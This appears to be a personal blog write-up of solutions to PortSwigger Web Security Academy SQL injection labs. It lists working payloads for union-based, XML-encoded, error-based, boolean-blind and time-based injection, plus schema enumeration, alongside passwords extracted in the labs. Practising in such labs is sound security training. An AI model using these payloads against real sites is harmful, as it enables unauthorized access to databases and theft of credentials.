---
date: 2023-10-15
linktitle: sqli
title: Postswigger Server Based Attacks - SQLi
showreadingtime: true
tags: ['PortSwigger']
categories: ['PortSwigger']
---

# Different SQLi Methods
## Lab 1:
```
https://0aab00d603b57c2084c1bee800e900c4.web-security-academy.net/filter?category=Gifts'+OR+1=1--
```
## Lab 2:
```
administrator'--
```
## Lab 3:
```
USERNAME:
	carlos
	administrator
	wiener
PASSWORD:
	r5h2o8l8ebgh9t8qppua
	fppcw9cmla9y2g8ogewn
	p85707uom2jve88xzdqe

Query: 
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1 </productId><storeId><@hex_entities>1 UNION SELECT USERNAME FROM USERS<@/hex_entities></storeId></stockCheck>

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1 </productId><storeId><@hex_entities>1 UNION SELECT PASSWORD FROM USERS<@/hex_entities></storeId></stockCheck>
```


Other Solution:
# SQL | Concatenation Operator
![sqli](/assets/img/portswigger/sqli.png)


So the command is = **SELECT USERNAME || '~' || PASSWORD FROM USER**


### Lesson Learned: 
If `select *` doesn't work, then try enumerating the column names in SQLi

# Examining the Database:
### Type and DB Version
## Lab 4:
```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

'+UNION+SELECT+'abc','def'+FROM+dual--
```
## Lab 5:
```
'+UNION+SELECT+@@version,+NULL#
```
## Lab 6:
```
Command Used in Order:
1. '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- 
2. '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+WHERE+table_name='users_qubofo'--
3. +UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_qubofo'--
4. '+UNION+SELECT+username_kyyuna,password_oqqqlr+FROM+users_qubofo--
```
## Lab 7:
```
1. Pets'+UNION+SELECT+banner,+NULL+FROM+v$version--
2. Pets'+UNION+SELECT+TABLE_NAME,+NULL+FROM+all_tables--
3. Pets'+UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+table_name+%3d+'USERS_NONJYH'+--
4. Pets'+UNION+SELECT+PASSWORD_EXZTUS,USERNAME_QLDKXB+FROM+USERS_NONJYH--
```
# SQLi Union Attacks
## Lab 8:
```
'+UNION+SELECT+NULL,NULL,NULL--
```
## Lab 9:
```
'+UNION+SELECT+NULL,'7GGmn4',NULL--
```
## Lab 10:
```
' UNION SELECT username, password FROM users--

administrator: 8o6kq54jl24imiyzzk0b
```
### Retrieving multiple values within a single column
## Lab 11:
```
'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--

administrator: ce9rlx1bhleviznzn0bi
```
# Blind SQLi Attacks
## Lab 12:
```
'+AND+(SELECT+username+FROM+Users+WHERE+Username+%3d+'administrator'+AND+LENGTH(password)=20)='administrator'--;   
```
#### -->Found password length to be 20 chars, With Brute force at +1 and f
#### Password for Admin
```
'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username+%3d+'administrator'),+1,+1)+=+'f;

administrator: f85j8tx4cnua3jqa28pi
```
# Error-Based Blind SQLi Attacks
## Lab 13:
#### -->Found password length to be 20 chars, With Brute force at 40
```
+||+(SELECT+CASE+WHEN+(1%3d1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+where+username='administrator'+AND+LENGTH(password)>§40§)+||+''
```
#### Password for Admin
```
'+||+(SELECT+CASE+WHEN+(1%3d1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+where+username='administrator'+AND+SUBSTR(password,1,1)='2')+||+

administrator: 2ukoj4td2zvkaqh1dmyv
```
## Lab 14:
```
Cookie: TrackingId='AND 1=CAST((SELECT password FROM users LIMIT 1) AS int) --; 

administrator: jmemf0pclmffjxgz7g4u
```
##### Reference Video: 
<https://www.youtube.com/watch?v=uTS1jXjPEMU>
# Time-Based SQLi Attacks
## Lab 15:
```
'+||+(SELECT+pg_sleep(10))--+
```
## Lab 16:
#### Confirming Postgresql DB
```
'+||+(SELECT+pg_sleep(10))--+
```
#### -->Found password length to be 20 chars, With Brute force at 2
```
'+||+(SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,1,1)='2')+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users)--+

administrator: axccyutitlo85hdnxew8
```